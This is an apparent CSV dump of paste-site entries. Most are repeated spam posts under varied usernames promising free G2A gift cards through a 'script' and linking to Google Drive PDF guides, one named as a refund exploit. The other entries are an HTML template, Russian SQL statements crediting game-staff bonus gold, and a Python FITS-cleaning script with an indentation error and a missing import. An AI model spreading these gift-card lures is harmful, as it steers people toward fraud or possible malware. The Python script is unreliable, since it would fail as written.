id,title,username,language,date,content
CrEFEyaY,🤑G2A.com Free Gift Card FIX July 2024🤑,x3kiN,JavaScript,Sunday 30th of June 2024 12:59:58 PM CDT,"G2A.com complimentary gift card & gaming guide.
Any gift card for free on G2A.com including Xbox gift cards & all else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
July 1 2024

"
8ZS17MHQ,🤑G2A.com Free Gift Card FIX July 2024🤑,x3kiN,JavaScript,Sunday 30th of June 2024 12:59:28 PM CDT,"G2A.com free gift card & games guide.
Any gift card for free on G2A.com including Xbox gift cards & all else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
3NqaQ4n7,Vigilante Shit,psychoticodes,HTML,Sunday 30th of June 2024 12:57:52 PM CDT,"<link href=""https://dl.dropboxusercontent.com/scl/fi/3aozng5oq0p8z2jg869dc/vigilanteshit.css?rlkey=o7cw8xpl49iz53f0ul20yndcs&st=yyi0r6zl&dl=0"" rel=""stylesheet""><div id=""vigilant"" style=""--width:550px; --back:#FFFFFF;--color:#000000;""><div class=""vigti"">Lately, I've been dressing for revenge</div><div class=""vigsub"">And I don't dress for villains Or for innocents I'm on my vigilante shit again</div><div class=""vigitxt""><div class=""vigibox""><div class=""vig1""> Alguma Pessoa</div><div class=""vig2""> Algum Local</div></div>Seu Texto Vai Aqui!</div></div>"
rgdpM42r,🤑G2A.com Free Gift Card FIX July 2024🎁,FeasModz514,JavaScript,Sunday 30th of June 2024 12:53:55 PM CDT,"G2A.com free voucher & gaming guide.
Any item for free on G2A.com including Xbox gift cards & all else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
July 1 2024

"
ftM9sq4K,🤑G2A.com Free Gift Card FIX July 2024🤑,FeasModz514,JavaScript,Sunday 30th of June 2024 12:53:25 PM CDT,"G2A.com complimentary voucher & gaming guide.
Any gift card for free on G2A.com including Amazon gift cards & anything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
C61wnW36,🤑G2A.com Free Gift Card FIX July 2024🎁,kiraezwhethe,JavaScript,Sunday 30th of June 2024 12:47:52 PM CDT,"G2A.com free gift card & gaming guide.
Any voucher for free on G2A.com including Playstation gift cards & all else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
July 1 2024

"
2bPTfydk,🤑G2A.com Free Gift Card FIX July 2024🤑,kjihu25,JavaScript,Sunday 30th of June 2024 12:47:06 PM CDT,"G2A.com free voucher & games guide.
Any item for free on G2A.com including Amazon gift cards & anything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
LKKyJVuh,Untitled,Locative,SQL,Sunday 30th of June 2024 12:44:23 PM CDT,"-- [ Оплата за: июнь]
 
--------- [ Отработанное время: ]
 
Locative: 27 (х5), 12 (FUN) 149 (x100) -- 188
Зилиус: 0 (х5), 120 (x100) -- 120
Khyntia:  (x5), 86 (FUN), 0 (x100) -- 86
jegerm  - EN GM: 9 (х5), 89 (FUN), 7 (x100) -- 105
Чеширский Кот: 2 (x5), 1 (FUN), 107 (x100) -- 110
Mairena: 5 (х5), 0 (FUN) 124 (x100) -- 129
Lorad: 0 (x100) -- 0



--------- [ Бонусы: ]

UPDATE `bonus` SET `gold`=gold+4000 WHERE `id`='1407530'; -- Locative(3000ГМ + 1000РГМ)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1407530, NOW(), 4000, '+4000 золотых бонусов - з/п Ргм Locative за июнь');

UPDATE `bonus` SET `gold`=gold+3000 WHERE `id`='229884'; -- Зилиус (ГМ)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (229884, NOW(), 3000, '+3000 золотых бонусов - з/п ГМ Зилиус за июнь');

UPDATE `bonus` SET `gold`=gold+1500 WHERE `id`='949105'; -- Khyntia (ГМ).
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (949105, NOW(), 1500, '+1500 золотых бонусов - з/п ГМ Khyntia за июнь'); 

UPDATE `bonus` SET `gold`=gold+3500 WHERE `id`='455260'; -- Jegerm (EN GM) + md FB.
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (455260, NOW(), 3500, '+3500 золотых бонусов - з/п ГМ Jegerm за июнь'); 

UPDATE `bonus` SET `gold`=gold+3000 WHERE `id`='810625'; -- Чеширский Кот 2
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (810625, NOW(), 3000, '+3000 золотых бонусов - з/п ГМ Чеширский Кот за июнь'); 

UPDATE `bonus` SET `gold`=gold+3000 WHERE `id`='1407530'; -- Mairena
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1407530, NOW(), 3000, '+3000 золотых бонусов - з/п ГМ Mairena за июнь'); 


-- Техническая поддержка

UPDATE `bonus` SET `gold`=gold+1000 WHERE `id`='456853'; -- Seanone
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (456853, NOW(), 1000, '+1000 золотых бонусов - з/п тех.поддержки Seanone за июнь'); 


-- QA Team

UPDATE `bonus` SET `gold`=gold+0 WHERE `id`='211220'; -- nastyasia
UPDATE `bonus` SET `gold`=gold+0 WHERE `id`='1507620'; -- Reberalo
UPDATE `bonus` SET `gold`=gold+0 WHERE `id`='1764135'; -- Odyson (Прайдоха)"
pS219dxg,cut NaNs from PanStarrs images and converts Variance image to Sigma Image,canorve,Python,Sunday 30th of June 2024 12:43:57 PM CDT,"#! /usr/bin/env python3

import numpy as np
import argparse
import os

from astropy.io import fits

# program to be used for panstarrs data
# Load your FITS file
def main():

    parser = argparse.ArgumentParser(description=""resizes image to cutout nan regions and removes nan pixels. It optionally converts the variance image to sigma and resizes it"")
    parser.add_argument(""ImageFile"", help=""Fits image file"")
    
    parser.add_argument(""-var"",""--variance"", type=str, help=""the variance image file"")

    args = parser.parse_args()
    image_file = args.ImageFile
    variance_file = args.variance


    if not os.path.exists(image_file):
        print ('{} image filename does not exist!'.format(image_file))
        sys.exit(1)

    if variance_file:
        if not os.path.exists(variance_file):
            print ('{} image filename does not exist!'.format(variance_file))
            sys.exit(1)



    hdul = fits.open(image_file)

    # Access the CompImageHDU (assuming it's the first extension)

    # Extract the data
    data = hdul[0].data

    valid_rows = ~np.isnan(data).all(axis=1)
    valid_cols = ~np.isnan(data).all(axis=0)

    cleaned_data = data[valid_rows][:, valid_cols]

    masknan = np.isnan(cleaned_data)
    cleaned_data[masknan] = 30000

    hdul[0].data= cleaned_data 
    hdul.writeto(image_file.replace(""fits"", ""new.fits""), overwrite=True)
    hdul.close()



    if variance_file:

        hdus = fits.open(variance_file)
        var_data = hdus[0].data

        var_data[np.isnan(var_data)] = 1e7
        sig_data = np.sqrt(var_data)

        cleaned_sigma = sig_data[valid_rows][:, valid_cols]
        

        hdu_new = fits.PrimaryHDU(cleaned_sigma, hdus[0].header)
        hdu_new.header[""IMTYPE""] = ""sigma""
        hdu_new.header[""BUNIT""] = ""It is unkknown""
        hdu_new.writeto(variance_file.replace(""fits"", ""sigma.fits""), overwrite=True)

   		hdus.close()



    print(""Done"")




if __name__ == '__main__':
    main()
"
qfUM8EMA,🎁 G2A.COM FREE GIFT CARD GUIDE JUN 2024 V4 🎁,jusst2k4,GetText,Sunday 30th of June 2024 12:42:56 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_250685.pdf
 
Working as of:
30 June 2024"
Miy3vby7,🤑G2A.com Free Gift Card FIX July 2024🎁,7AcxeMC,JavaScript,Sunday 30th of June 2024 12:41:47 PM CDT,"G2A.com free voucher & games guide.
Any gift card for free on G2A.com including Playstation gift cards & everything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
1st of July 2024

"
W3sg7SQs,🤑G2A.com Free Gift Card FIX July 2024🤑,Bufayez,JavaScript,Sunday 30th of June 2024 12:41:01 PM CDT,"G2A.com complimentary voucher & gaming guide.
Any voucher for free on G2A.com including Playstation gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
1st of July 2024

"
0QZzuwFd,🤑G2A.com Free Gift Card FIX July 2024🤑,tvprekointerneta00,JavaScript,Sunday 30th of June 2024 12:35:44 PM CDT,"G2A.com free voucher & gaming guide.
Any gift card for free on G2A.com including Playstation gift cards & anything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
1st of July 2024

"
